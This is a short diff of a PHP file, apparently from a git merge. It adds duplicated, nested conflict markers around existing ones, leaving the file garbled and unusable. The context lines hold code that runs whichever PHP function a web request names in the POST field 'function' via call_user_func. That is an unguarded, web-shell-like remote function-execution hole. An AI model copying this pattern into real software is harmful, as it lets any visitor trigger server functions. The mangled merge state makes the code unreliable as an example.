@@ -1,5 +1,8 @@
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
+=======
+>>>>>>> a19dbeb (.)
 <?php
 
 declare(strict_types=1);
@@ -27,5 +30,9 @@ if (! \function_exists($_POST['function'])) {
     die('Function not found');
 } else {
     \call_user_func($_POST['function']);
+<<<<<<< HEAD
 }
 >>>>>>> 36ca29c (.)
+=======
+}
+>>>>>>> a19dbeb (.)
